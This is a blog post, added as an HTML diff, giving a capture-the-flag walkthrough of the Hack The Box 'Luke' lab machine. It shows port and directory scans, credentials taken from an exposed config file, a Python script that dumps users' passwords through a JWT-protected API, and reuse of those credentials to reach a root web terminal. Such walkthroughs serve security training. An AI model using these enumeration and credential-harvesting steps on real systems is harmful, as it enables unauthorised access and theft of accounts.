@@ -1,0 +1,484 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | Luke - Hack The Box</title>
+  <meta name="description" content="Resolution of the Luke machine">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Luke - Hack The Box">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/luke">
+  <meta property="og:description" content="Resolution of the Luke machine">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/luke">
+  <meta name="twitter:title" content="Luke - Hack The Box">
+  <meta name="twitter:description" content="Resolution of the Luke machine">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/luke/luke-00-0d2173452f867bf2197f265c923f6cca071965cde9154c36b7d3007087cb08c0.png">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/luke/luke-00-0d2173452f867bf2197f265c923f6cca071965cde9154c36b7d3007087cb08c0.png">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Luke - Hack The Box</h1>
+            <p>Resolution of the Luke machine</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    July 4, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      6 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/hackthebox/luke/luke-00-0d2173452f867bf2197f265c923f6cca071965cde9154c36b7d3007087cb08c0.png">
+  <img src="/assets/hackthebox/luke/luke-00-0d2173452f867bf2197f265c923f6cca071965cde9154c36b7d3007087cb08c0.png" alt="Luke banner" class="zooming" data-rjs="/assets/hackthebox/luke/luke-00-0d2173452f867bf2197f265c923f6cca071965cde9154c36b7d3007087cb08c0.png" data-zooming-width="534" data-zooming-height="339" />
+</a></p>
+
+<p>Luke is a medium level machine based on FreeBSD, the initial approach is heavily based on <code class="highlighter-rouge">web enumeration</code> and <code class="highlighter-rouge">credentials</code>, the enumeration process requires a <code class="highlighter-rouge">strong set of wordlists</code> in order to discover the key-files. We need to understand how an <code class="highlighter-rouge">API</code> works.
+The privilege escalation process is not needed.</p>
+
+<h1 id="recon">Recon</h1>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># Nmap 7.80 scan initiated Sun May 10 09:19:54 2020 as: nmap -sC -sV -T5 --min-parallelism=50 -n --min-rate=300 -oA luke -p- 10.10.10.137</span>
+Warning: 10.10.10.137 giving up on port because retransmission cap hit <span class="o">(</span>2<span class="o">)</span><span class="nb">.</span>
+Nmap scan report <span class="k">for </span>10.10.10.137
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 62273 closed ports, 3257 filtered ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3+ <span class="o">(</span>ext.1<span class="o">)</span>
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+|_drwxr-xr-x    2 0        0             512 Apr 14  2019 webapp
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.34
+|      Logged <span class="k">in </span>as ftp
+|      TYPE: ASCII
+|      No session upload bandwidth limit
+|      No session download bandwidth limit
+|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3+ <span class="o">(</span>ext.1<span class="o">)</span> - secure, fast, stable
+|_End of status
+22/tcp   open  ssh?
+|_ssh-hostkey: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+80/tcp   open  http    Apache httpd 2.4.38 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.3.3<span class="o">)</span>
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.38 <span class="o">(</span>FreeBSD<span class="o">)</span> PHP/7.3.3
+|_http-title: Luke
+3000/tcp open  http    Node.js Express framework
+|_http-title: Site doesnt have a title <span class="o">(</span>application/json<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8<span class="o">)</span><span class="nb">.</span>
+8000/tcp open  http    Ajenti http control panel
+|_http-title: Ajenti
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sun May 10 09:29:02 2020 -- 1 IP address (1 host up) scanned in 547.96 seconds</span></code></pre></figure>
+
+<p>Starting with the port 21, the FTP server allows annonymous login. There’s a text file named <code class="highlighter-rouge">for_Chihiro.txt</code> with the following content:</p>
+
+<blockquote>
+  <p>Dear Chihiro !!</p>
+
+  <p>As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of the actual website I’ve created . Normally you should know where to look but hurry up because I will delete them soon because of our security policies !</p>
+
+  <p>Derry</p>
+</blockquote>
+
+<p>On port 80 there’s a static page:</p>
+
+<p><a href="/assets/hackthebox/luke/luke-01-e872ad9288e0d0ebcee3bef74ad95413e803135efcec6152ebb6e7151ba6deed.png">
+  <img src="/assets/hackthebox/luke/luke-01-e872ad9288e0d0ebcee3bef74ad95413e803135efcec6152ebb6e7151ba6deed.png" alt="Luke Recon" class="zooming" data-rjs="/assets/hackthebox/luke/luke-01-e872ad9288e0d0ebcee3bef74ad95413e803135efcec6152ebb6e7151ba6deed.png" data-zooming-width="1318" data-zooming-height="556" />
+</a></p>
+
+<p>On port 3000 there’s a <code class="highlighter-rouge">API</code> made in Express that requires authentication, possible through any kind of token.</p>
+
+<p><a href="/assets/hackthebox/luke/luke-02-b6061fb1e4a076dd1523ad0f956a93eb1eba9cbc209b9f6f6769a8463345fe6d.png">
+  <img src="/assets/hackthebox/luke/luke-02-b6061fb1e4a076dd1523ad0f956a93eb1eba9cbc209b9f6f6769a8463345fe6d.png" alt="Luke Recon" class="zooming" data-rjs="/assets/hackthebox/luke/luke-02-b6061fb1e4a076dd1523ad0f956a93eb1eba9cbc209b9f6f6769a8463345fe6d.png" data-zooming-width="924" data-zooming-height="213" />
+</a></p>
+
+<p>On port 8000 there’s an administrative panel from a service named <code class="highlighter-rouge">Ajenti</code>, Ajenti an administrative panel to control your server.</p>
+
+<p><a href="/assets/hackthebox/luke/luke-03-439330e72e6100b9c14ef6815d6c678567b78bce800d11eb263879db01821fc8.png">
+  <img src="/assets/hackthebox/luke/luke-03-439330e72e6100b9c14ef6815d6c678567b78bce800d11eb263879db01821fc8.png" alt="Luke Recon" class="zooming" data-rjs="/assets/hackthebox/luke/luke-03-439330e72e6100b9c14ef6815d6c678567b78bce800d11eb263879db01821fc8.png" data-zooming-width="1318" data-zooming-height="554" />
+</a></p>
+
+<p>After the initial recon we need to enumerate the web directories to find folders and files with potentially vulnerabilities or juicy informations.</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-u</span> http://luke.htb/ <span class="nt">-t</span> 200 <span class="nt">--timeout</span> 30s <span class="nt">-x</span> .php,.txt
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://luke.htb/
+<span class="o">[</span>+] Threads:        200
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Extensions:     php,txt
+<span class="o">[</span>+] Timeout:        30s
+<span class="o">===============================================================</span>
+2020/05/10 13:36:38 Starting gobuster
+<span class="o">===============================================================</span>
+/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htaccess.php <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htaccess.txt <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htpasswd.php <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htpasswd.txt <span class="o">(</span>Status: 403<span class="o">)</span>
+/LICENSE <span class="o">(</span>Status: 200<span class="o">)</span>
+/config.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/css <span class="o">(</span>Status: 301<span class="o">)</span>
+/js <span class="o">(</span>Status: 301<span class="o">)</span>
+/login.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/management <span class="o">(</span>Status: 401<span class="o">)</span>
+/member <span class="o">(</span>Status: 301<span class="o">)</span>
+/vendor <span class="o">(</span>Status: 301<span class="o">)</span>
+<span class="o">===============================================================</span>
+2020/05/10 13:37:39 Finished
+<span class="o">===============================================================</span></code></pre></figure>
+
+<p>The <code class="highlighter-rouge">config.php</code> file has the following content:</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="nv">$dbHost</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span> 
+<span class="nv">$dbUsername</span> <span class="o">=</span> <span class="s1">'root'</span><span class="p">;</span> 
+<span class="nv">$dbPassword</span> <span class="o">=</span> <span class="s1">'Zk6heYCyv6ZE9Xcg'</span><span class="p">;</span> 
+<span class="nv">$db</span> <span class="o">=</span> <span class="s2">"login"</span><span class="p">;</span> 
+<span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$dbHost</span><span class="p">,</span> <span class="nv">$dbUsername</span><span class="p">,</span> <span class="nv">$dbPassword</span><span class="p">,</span><span class="nv">$db</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Connect failed: %s</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span> <span class="nv">$conn</span> <span class="o">-&gt;</span> <span class="na">error</span><span class="p">);</span> </code></pre></figure>
+
+<p>This is a local database, only accessible internally.</p>
+
+<p>Now it’s time to enumerate the API service with gobuster, in the end we got the following output:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-u</span> http://luke.htb:3000 <span class="nt">-t</span> 100
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://luke.htb:3000
+<span class="o">[</span>+] Threads:        100
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/05/13 19:34:21 Starting gobuster
+<span class="o">===============================================================</span>
+/Login <span class="o">(</span>Status: 200<span class="o">)</span>
+/login <span class="o">(</span>Status: 200<span class="o">)</span>
+/users <span class="o">(</span>Status: 200<span class="o">)</span>
+<span class="o">===============================================================</span>
+2020/05/13 19:34:53 Finished
+<span class="o">===============================================================</span></code></pre></figure>
+
+<p>The result shows some API endpoints that handle with different actions, such the authentication process and list the users.</p>
+
+<p>Using the credentials of <code class="highlighter-rouge">config.php</code> in the API authentication endpoint seems to work, now we have an authentication token as admin user!</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">curl <span class="nt">-s</span> <span class="s2">"http://luke.htb:3000/login"</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">--data</span> <span class="s1">'{"username":"admin", "password":"Zk6heYCyv6ZE9Xcg"}'</span> | jq .token</code></pre></figure>
+
+<p><a href="/assets/hackthebox/luke/luke-04-317ccf8676a4d4fed27f3a954428915c38bf814b2339458de7d3dcf03b80e367.png">
+  <img src="/assets/hackthebox/luke/luke-04-317ccf8676a4d4fed27f3a954428915c38bf814b2339458de7d3dcf03b80e367.png" alt="Luke Recon" class="zooming" data-rjs="/assets/hackthebox/luke/luke-04-317ccf8676a4d4fed27f3a954428915c38bf814b2339458de7d3dcf03b80e367.png" data-zooming-width="1089" data-zooming-height="35" />
+</a></p>
+
+<p>Analyzing the token structure, it’s possible to deduce that it’s a <code class="highlighter-rouge">JWT token</code>, they can be decoded using the following site: <a href="https://jwt.io/" target="_blank">https://jwt.io/</a></p>
+
+<p>I made a small script to get the authentication token and dump the users:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># -*- coding:utf-8 -*-
+</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    
+    <span class="c1"># session
+</span>    <span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
+    
+    <span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'username'</span> <span class="p">:</span> <span class="s">'admin'</span><span class="p">,</span> <span class="s">'password'</span><span class="p">:</span> <span class="s">'Zk6heYCyv6ZE9Xcg'</span><span class="p">}</span>
+        
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://luke.htb:3000/login"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>   
+        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+                <span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="s">'token'</span><span class="p">]</span>
+    
+    
+    <span class="k">def</span> <span class="nf">get_users</span><span class="p">():</span>
+        <span class="n">auth_token</span> <span class="o">=</span> <span class="n">login</span><span class="p">()</span>
+        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Authorization'</span><span class="p">:</span> <span class="n">auth_token</span><span class="p">}</span>
+        
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://luke.htb:3000/users"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>    
+        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>     
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">users</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+          
+            <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>                
+                <span class="k">try</span><span class="p">:</span>
+                    <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://luke.htb:3000/users/{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="s">"name"</span><span class="p">]),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>            
+                <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                    <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>          
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="k">print</span><span class="p">(</span><span class="s">"[*] {}:{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="s">"name"</span><span class="p">],</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="s">"password"</span><span class="p">]))</span>
+    
+    <span class="c1"># main
+</span>    <span class="n">get_users</span><span class="p">()</span>
+    
+      
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span></code></pre></figure>
+
+<p>After the execution, we dumped all the users from their database:</p>
+
+<p><a href="/assets/hackthebox/luke/luke-05-0b54b9cf82b33ee9dbf46f16e66e35b3b8124a40644ea34f482df0a89e5f34e5.png">
+  <img src="/assets/hackthebox/luke/luke-05-0b54b9cf82b33ee9dbf46f16e66e35b3b8124a40644ea34f482df0a89e5f34e5.png" alt="Luke Recon" class="zooming" data-rjs="/assets/hackthebox/luke/luke-05-0b54b9cf82b33ee9dbf46f16e66e35b3b8124a40644ea34f482df0a89e5f34e5.png" data-zooming-width="319" data-zooming-height="79" />
+</a></p>
+
+<p>After the user dump, we need to test these credentials on multiple points to see if we can authenticate and after some tries, we find that the credentials <code class="highlighter-rouge">Derry:rZ86wwLvx7jUxtch</code> had success in <code class="highlighter-rouge">luke.htb/management</code>:</p>
+
+<p><a href="/assets/hackthebox/luke/luke-06-73f0506baab4c2c397918f6b052037dc441d4a4f5d6c64b101f65db8da841e42.png">
+  <img src="/assets/hackthebox/luke/luke-06-73f0506baab4c2c397918f6b052037dc441d4a4f5d6c64b101f65db8da841e42.png" alt="Luke Recon" class="zooming" data-rjs="/assets/hackthebox/luke/luke-06-73f0506baab4c2c397918f6b052037dc441d4a4f5d6c64b101f65db8da841e42.png" data-zooming-width="797" data-zooming-height="236" />
+</a></p>
+
+<p>The <code class="highlighter-rouge">config.json</code> file has an additional credential, this credentials belongs to <code class="highlighter-rouge">Ajenti</code>:</p>
+
+<p><a href="/assets/hackthebox/luke/luke-07-cdb5f11ceb8ba3d152daf4c66e2e7c782038e80a1812ab5f925bd02ad6447807.png">
+  <img src="/assets/hackthebox/luke/luke-07-cdb5f11ceb8ba3d152daf4c66e2e7c782038e80a1812ab5f925bd02ad6447807.png" alt="Luke Recon" class="zooming" data-rjs="/assets/hackthebox/luke/luke-07-cdb5f11ceb8ba3d152daf4c66e2e7c782038e80a1812ab5f925bd02ad6447807.png" data-zooming-width="1308" data-zooming-height="560" />
+</a></p>
+
+<p>After testing these credentials (<code class="highlighter-rouge">root:KpMasng6S5EtTy9Z</code>) on Ajenti’s administrative panel, we’re able to control the entire system throught the web!</p>
+
+<p><a href="/assets/hackthebox/luke/luke-08-70e27955920e21fa900ed0b6054b12550213568b3a75196f82b8bae0ed9d688e.png">
+  <img src="/assets/hackthebox/luke/luke-08-70e27955920e21fa900ed0b6054b12550213568b3a75196f82b8bae0ed9d688e.png" alt="Luke Recon" class="zooming" data-rjs="/assets/hackthebox/luke/luke-08-70e27955920e21fa900ed0b6054b12550213568b3a75196f82b8bae0ed9d688e.png" data-zooming-width="1307" data-zooming-height="550" />
+</a></p>
+
+<p>The Ajenti web application has a web interface that emulates the system’s terminal with root access as default, this terminal is located at <code class="highlighter-rouge">Tool &gt; Terminal &gt; New</code>.</p>
+
+<p>A root shell will be spawned, after that we’re able to capture both flags!</p>
+
+<p><a href="/assets/hackthebox/luke/luke-09-b0c63e004cbc05d9b21410aa924abb491b7569168d2f5fa465ba1cd9c1d5fd7f.png">
+  <img src="/assets/hackthebox/luke/luke-09-b0c63e004cbc05d9b21410aa924abb491b7569168d2f5fa465ba1cd9c1d5fd7f.png" alt="Luke Recon" class="zooming" data-rjs="/assets/hackthebox/luke/luke-09-b0c63e004cbc05d9b21410aa924abb491b7569168d2f5fa465ba1cd9c1d5fd7f.png" data-zooming-width="920" data-zooming-height="235" />
+</a></p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Luke+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/luke%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/luke" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
